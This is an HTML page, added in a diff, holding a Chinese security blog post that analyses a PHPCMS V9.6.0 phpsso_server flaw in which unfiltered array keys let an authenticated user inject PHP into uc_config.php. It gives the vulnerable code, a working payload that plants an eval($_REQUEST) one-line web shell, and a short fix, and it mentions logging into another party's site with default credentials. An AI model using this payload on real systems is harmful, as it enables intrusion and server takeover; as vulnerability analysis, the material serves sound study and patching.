@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        PHPCMS V9.6.0后台设计缺陷导致getshell - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01%E8%83%8C%E6%99%AF"><span class="toc-text">0x01背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x02漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03%E6%BC%8F%E6%B4%9E%E8%AF%81%E6%98%8E"><span class="toc-text">0x03漏洞证明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">0x04漏洞修复</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        PHPCMS V9.6.0后台设计缺陷导致getshell
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2017-01-26 20:28:00</span></span>
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h3 id="0x01背景"><a href="#0x01背景" class="headerlink" title="0x01背景"></a>0x01背景</h3><p>前几天瞎逛，碰到个phpcms，默认用户名密码都改了，试了试phpsso_server，phpcms + phpcms就上去了。。。<br>在网上还真找到一个利用方法</p>
+<ul>
+<li><a href="http://www.cnblogs.com/wocalieshenmegui/p/5916660.html" target="_blank">http://www.cnblogs.com/wocalieshenmegui/p/5916660.html</a></li>
+<li><a href="http://www.cnbraid.com/2016/phpcms.html" target="_blank">http://www.cnbraid.com/2016/phpcms.html</a></li>
+</ul>
+<p>意外顺利的getshell，然而人家常备百度卫士，连cmd都不能执行。。。。<br>感觉这个漏洞没有文章说的那么鸡肋（两次登录），直接登录phpsso_server就好了，而且人们对于phpsso_server也不太重视，很容易使用弱口令，所以杀伤力还是很大的。</p>
+<span id="more"></span>
+
+<h3 id="0x02漏洞分析"><a href="#0x02漏洞分析" class="headerlink" title="0x02漏洞分析"></a>0x02漏洞分析</h3><p>问题出现在<code>ROOTDIR/phpsso_server/phpcms/modules/admin/system.php</code>的uc函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dosubmit&#x27;</span>])) &#123;</span><br><span class="line">		<span class="variable">$data</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="variable">$data</span>[<span class="string">&#x27;ucuse&#x27;</span>] = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ucuse&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ucuse&#x27;</span>]) ? <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ucuse&#x27;</span>]) : <span class="number">0</span>;</span><br><span class="line">		<span class="variable">$filepath</span> = CACHE_PATH.<span class="string">&#x27;configs&#x27;</span>.DIRECTORY_SEPARATOR.<span class="string">&#x27;system.php&#x27;</span>;</span><br><span class="line">		<span class="variable">$config</span> = <span class="keyword">include</span> <span class="variable">$filepath</span>;</span><br><span class="line">		<span class="variable">$uc_config</span> = <span class="string">&#x27;&lt;?php &#x27;</span>.<span class="string">&quot;\ndefine(&#x27;UC_CONNECT&#x27;, &#x27;mysql&#x27;);\n&quot;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="variable">$old</span>[] = <span class="string">&quot;&#x27;<span class="subst">$k</span>&#x27;=&gt;&#x27;&quot;</span>.(<span class="keyword">isset</span>(<span class="variable">$config</span>[<span class="variable">$k</span>]) ? <span class="variable">$config</span>[<span class="variable">$k</span>] : <span class="variable">$v</span>).<span class="string">&quot;&#x27;,&quot;</span>;</span><br><span class="line">			<span class="variable">$new</span>[] = <span class="string">&quot;&#x27;<span class="subst">$k</span>&#x27;=&gt;&#x27;<span class="subst">$v</span>&#x27;,&quot;</span>;</span><br><span class="line">			<span class="variable">$uc_config</span> .= <span class="string">&quot;define(&#x27;&quot;</span>.<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$k</span>).<span class="string">&quot;&#x27;, &#x27;<span class="subst">$v</span>&#x27;);\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$html</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filepath</span>);</span><br><span class="line">		<span class="variable">$html</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$old</span>, <span class="variable">$new</span>, <span class="variable">$html</span>);</span><br><span class="line">		<span class="variable">$uc_config_filepath</span> = CACHE_PATH.<span class="string">&#x27;configs&#x27;</span>.DIRECTORY_SEPARATOR.<span class="string">&#x27;uc_config.php&#x27;</span>;</span><br><span class="line">		@<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uc_config_filepath</span>, <span class="variable">$uc_config</span>);</span><br><span class="line">		@<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filepath</span>, <span class="variable">$html</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">insert</span>(<span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;ucenter&#x27;</span>, <span class="string">&#x27;data&#x27;</span>=&gt;<span class="title function_ invoke__">array2string</span>(<span class="variable">$data</span>)), <span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">		<span class="title function_ invoke__">showmessage</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;operation_success&#x27;</span>), HTTP_REFERER);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$r</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">get_one</span>(<span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;ucenter&#x27;</span>));</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$r</span>) &#123;</span><br><span class="line">		<span class="variable">$data</span> = <span class="title function_ invoke__">string2array</span>(<span class="variable">$r</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">admin_tpl</span>(<span class="string">&#x27;system_uc&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里这段代码将data变量遍历</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">	<span class="variable">$old</span>[] = <span class="string">&quot;&#x27;<span class="subst">$k</span>&#x27;=&gt;&#x27;&quot;</span>.(<span class="keyword">isset</span>(<span class="variable">$config</span>[<span class="variable">$k</span>]) ? <span class="variable">$config</span>[<span class="variable">$k</span>] : <span class="variable">$v</span>).<span class="string">&quot;&#x27;,&quot;</span>;</span><br><span class="line">	<span class="variable">$new</span>[] = <span class="string">&quot;&#x27;<span class="subst">$k</span>&#x27;=&gt;&#x27;<span class="subst">$v</span>&#x27;,&quot;</span>;</span><br><span class="line">	<span class="variable">$uc_config</span> .= <span class="string">&quot;define(&#x27;&quot;</span>.<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$k</span>).<span class="string">&quot;&#x27;, &#x27;<span class="subst">$v</span>&#x27;);\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>$uc_config拼接完毕后写入到<code>ROOTDIR/phpsso_server/caches/configs/uc_config.php</code>中，这段没做任何的过滤，那前面$data是通过$_POST接受过来的，有没有经过过滤呢？<br>在<code>ROOTDIR/phpcms/libs/classes/param.class.php</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>()) &#123;</span><br><span class="line">	<span class="variable">$_POST</span> = <span class="title function_ invoke__">new_addslashes</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="variable">$_GET</span> = <span class="title function_ invoke__">new_addslashes</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="variable">$_REQUEST</span> = <span class="title function_ invoke__">new_addslashes</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">	<span class="variable">$_COOKIE</span> = <span class="title function_ invoke__">new_addslashes</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*...省略...*/</span></span><br></pre></td></tr></table></figure>
+<p>继续跟踪new_addslashes函数,到<code>ROOTDIR/phpcms/libs/functions/global.func.php</code>处</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) </span><br><span class="line">        <span class="variable">$string</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">new_addslashes</span>(<span class="variable">$val</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里仅仅是将数组的value用addslashes（<code>过滤单引号（&#39;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）。</code>）过滤了一下，<code>对key没有作任何处理</code>，所以上面$data数组的key是可控的，我们可以根据这一点构造并getshell。</p>
+<h3 id="0x03漏洞证明"><a href="#0x03漏洞证明" class="headerlink" title="0x03漏洞证明"></a>0x03漏洞证明</h3><p>登录phpsso_server，在系统设置处的Ucenter api 地址随意输入然后抓包，可以看到数据是以数组的形式提交的。<br><img src="https://seaii-blog.com/usr/uploads/2017/01/2649043015.jpg" alt="QQ截图20170126205412.jpg"><br>再看一眼<code>ROOTDIR/phpsso_server/caches/configs/uc_config.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;UC_CONNECT&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;UC_API&#x27;</span>, <span class="string">&#x27;http://localhost/comsenz/uc&#x27;</span>);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>这里利用key未被过滤，插入单引号将define结束，并在后面插入我们的一句话，所以我们将Ucenter api 地址输入框的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name改为 data[uc_api&#x27;,&#x27;11&#x27;);/*]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后输入 */eval($_REQUEST[test]);//。</span><br></pre></td></tr></table></figure>
+<p><img src="https://seaii-blog.com/usr/uploads/2017/01/1490528287.jpg" alt="QQ截图20170126175629.jpg"></p>
+<p><img src="https://seaii-blog.com/usr/uploads/2017/01/2432850336.jpg" alt="QQ截图20170126175657.jpg"></p>
+<p>此时uc_config.php变为<br><img src="https://seaii-blog.com/usr/uploads/2017/01/270412006.jpg" alt="QQ截图20170126210836.jpg"><br>成功插入一句话<br>批量利用的可能性不太大，毕竟要进后台，就不写py了。。。。。</p>
+<h3 id="0x04漏洞修复"><a href="#0x04漏洞修复" class="headerlink" title="0x04漏洞修复"></a>0x04漏洞修复</h3><p>在拼接$uc_config时对$k进行过滤</p>
+<p>ps：5个分类终于都有文章了，233333333333333333</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
